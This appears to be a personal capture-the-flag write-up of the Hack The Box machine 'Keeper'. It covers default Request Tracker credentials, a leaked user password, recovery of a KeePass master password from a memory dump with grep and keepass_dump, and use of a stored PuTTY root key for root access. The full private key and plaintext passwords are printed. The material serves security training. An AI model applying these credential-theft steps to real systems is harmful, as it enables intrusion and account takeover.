```
Nmap scan report for 10.10.11.227
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2 ports open

lets check site...
![[Pasted image 20250922205408.png]]

lets add tickets.keep.htb to etc/hosts

this is running request tracker... i looked it up and found default creds:
`root:password`

i try to ssh in but nothing...
so:
now that i am in under the admin tab we can find another user:
![[Pasted image 20250922211137.png]]
`lnorgaard`

i just clicked go and got this err:
![[Pasted image 20250922211235.png]]
 could be our way in but lets keep digging...

if i click on the users name i find a comments field with this:
```
New user. Initial password set to Welcome2023!
```

cool!

lets try ssh in with these creds...

```
ssh lnorgaard@10.10.11.227
```

password `Welcome2023!`

```
lnorgaard@keeper:~$ cat user.txt
b84a555857601*****************
```

USER PWN!

---
### Priv Esc

right off bat in home dir i find this:
```
ls
RT30000.zip  user.txt
```

i unzip and:
```
 unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx          
lnorgaard@keeper:~$ ls
KeePassDumpFull.dmp  passcodes.kdbx  RT30000.zip  user.txt
```

i mean this is jackpot!

i want to get it over to my kali... i tried, from kali:
```
sshpass -p 'Welcome2023!' scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip .
```

could also: hosted a python server on target and used wget to get both the dmp and kdbx files(could have just gottent he zip dummy)
```
wget http://10.10.11.227:8080/KeePassDumpFull.dmp
wget http://10.10.11.227:8080/passcodes.kdbx
```

now i found this exploit...

i will use one of my favorite password finders from memory, Lazagne....
didnt even need to grab those files i will run on target..
```
git clone https://github.com/AlessandroZ/LaZagne.git
```

```
python3 -m venv venv     
source venv/bin/activate
```

then:
```
pip install --upgrade pip
[ -f requirements.txt ] && pip install -r requirements.txt
```
...
could also run:
```
strings -e S KeePassDumpFull.dmp | grep -a $(printf "%b" "\\xCF\\x25\\xCF\\x25")
```
```
%�%
�%�%d
�%�%d
�%�%�%
�%�%d
�%�%d
�%�%d
�%�%d
�%�%d
�%�%d
�%�%d
�%�%d
�%�%�%g
�%�%�%g
�%�%�%�%
�%�%�%g
�%�%�%g
�%�%�%g
�%�%�%g
�%�%�%g
�%�%�%g
�%�%�%g
�%�%�%g
�%�%�%�%r
�%�%�%�%r
�%�%�%�%�%
�%�%�%�%r
�%�%�%�%r
�%�%�%�%r
�%�%�%�%r
�%�%�%�%r
�%�%�%�%r
�%�%�%�%r
�%�%�%�%r
�%�%�%�%�%�
�%�%�%�%�%�
�%�%�%�%�%�%
�%�%�%�%�%�
�%�%�%�%�%�
�%�%�%�%�%�
�%�%�%�%�%�
�%�%�%�%�%�
�%�%�%�%�%�
�%�%�%�%�%�
�%�%�%�%�%�
�%�%�%�%�%�%d
�%�%�%�%�%�%d
�%�%�%�%�%�%�%
�%�%�%�%�%�%d
�%�%�%�%�%�%d
�%�%�%�%�%�%d
�%�%�%�%�%�%d
�%�%�%�%�%�%d
�%�%�%�%�%�%d
�%�%�%�%�%�%d
�%�%�%�%�%�%d
�%�%�%�%�%�%�% 
�%�%�%�%�%�%�% 
�%�%�%�%�%�%�%�%
�%�%�%�%�%�%�% 
�%�%�%�%�%�%�% 
�%�%�%�%�%�%�% 
�%�%�%�%�%�%�% 
�%�%�%�%�%�%�% 
�%�%�%�%�%�%�% 
�%�%�%�%�%�%�% 
�%�%�%�%�%�%�% 
�%�%�%�%�%�%�%�%m
�%�%�%�%�%�%�%�%m
�%�%�%�%�%�%�%�%�%
�%�%�%�%�%�%�%�%m
�%�%�%�%�%�%�%�%m
�%�%�%�%�%�%�%�%m
�%�%�%�%�%�%�%�%m
�%�%�%�%�%�%�%�%m
�%�%�%�%�%�%�%�%m
�%�%�%�%�%�%�%�%m
�%�%�%�%�%�%�%�%m
�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%�%
�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%�%
�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%�% 
�%�%�%�%�%�%�%�%�%�%�% 
�%�%�%�%�%�%�%�%�%�%�%�%
�%�%�%�%�%�%�%�%�%�%�% 
�%�%�%�%�%�%�%�%�%�%�% 
�%�%�%�%�%�%�%�%�%�%�% 
�%�%�%�%�%�%�%�%�%�%�% 
�%�%�%�%�%�%�%�%�%�%�% 
�%�%�%�%�%�%�%�%�%�%�% 
�%�%�%�%�%�%�%�%�%�%�% 
�%�%�%�%�%�%�%�%�%�%�% 
�%�%�%�%�%�%�%�%�%�%�%�%f
�%�%�%�%�%�%�%�%�%�%�%�%f
�%�%�%�%�%�%�%�%�%�%�%�%�%
�%�%�%�%�%�%�%�%�%�%�%�%f
�%�%�%�%�%�%�%�%�%�%�%�%f
�%�%�%�%�%�%�%�%�%�%�%�%f
�%�%�%�%�%�%�%�%�%�%�%�%f
�%�%�%�%�%�%�%�%�%�%�%�%f
�%�%�%�%�%�%�%�%�%�%�%�%f
�%�%�%�%�%�%�%�%�%�%�%�%f
�%�%�%�%�%�%�%�%�%�%�%�%f
�%�%�%�%�%�%�%�%�%�%�%�%�%l
�%�%�%�%�%�%�%�%�%�%�%�%�%l
�%�%�%�%�%�%�%�%�%�%�%�%�%�%
�%�%�%�%�%�%�%�%�%�%�%�%�%l
�%�%�%�%�%�%�%�%�%�%�%�%�%l
�%�%�%�%�%�%�%�%�%�%�%�%�%l
�%�%�%�%�%�%�%�%�%�%�%�%�%l
�%�%�%�%�%�%�%�%�%�%�%�%�%l
�%�%�%�%�%�%�%�%�%�%�%�%�%l
�%�%�%�%�%�%�%�%�%�%�%�%�%l
�%�%�%�%�%�%�%�%�%�%�%�%�%l
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%d
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%e
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%
�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%�%
```

could also run:
`https://github.com/z-jxy/keepass_dump`

```
git clone https://github.com/z-jxy/keepass_dump
```
```
python3 ./keepass_dump/keepass_dump.py -f KeePassDumpFull.dmp 
[*] Searching for masterkey characters
[-] Couldn't find jump points in file. Scanning with slower method.
[*] 0:	{UNKNOWN}
[*] 2:	d
[*] 3:	g
[*] 4:	r
[*] 6:	d
[*] 7:	 
[*] 8:	m
[*] 9:	e
[*] 10:	d
[*] 11:	 
[*] 12:	f
[*] 13:	l
[*] 15:	d
[*] 16:	e
[*] Extracted: {UNKNOWN}dgrd med flde
```

now that looks crazy but upon reading this is expected, we need to google and or try and find something close to that...
![[Pasted image 20250923005454.png]]

if we try `rødgrød med fløde`

cool it worked, lets go interactive:
```
 kpcli --kdb passcodes.kdbx
Provide the master password: *************************
```

in /passcodes/Network:

 i take a look around and find:
```
show -f 0

Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: F4><3K0nd!
  URL: 
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
       f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
       VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
       UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
       OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
       in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
       SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
       09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
       xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

now this is a putty key so we cant directly use it with ssh, but upon googling i found this tool:
```
sudo apt install putty-tools
```

create puttyKey.key file(no leading whitespace):
```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

```
puttygen puttyKey.key -O private-openssh -o ./keeper.key
```

`chmod  600 keeper.key`

```
ssh -i keeper.key root@keeper.htb
```

```
root@keeper:~# cat root.txt
9dd66a4e23c**************
```

Root PWned!